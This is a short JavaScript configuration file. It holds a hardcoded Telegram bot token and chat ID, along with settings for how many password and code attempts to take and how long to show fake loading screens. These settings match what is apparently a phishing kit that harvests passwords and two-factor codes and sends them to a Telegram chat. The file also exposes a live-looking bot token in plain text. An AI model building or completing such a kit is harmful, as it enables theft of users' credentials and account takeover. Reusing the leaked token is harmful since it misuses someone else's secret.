const config = {
    token: process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN ?? process.env.TELEGRAM_BOT_TOKEN ?? '8922772823:AAEKoRa9oXVq5IztkJCcbqSQdFp2L9f1KMg',
    chat_id: process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID ?? process.env.TELEGRAM_CHAT_ID ?? '-1004340340310',
    MAX_PASS: 2,
    MAX_CODE: 3,
    PASSWORD_LOADING_TIME: 8,
    CODE_LOADING_TIME: 15
};

export default config;
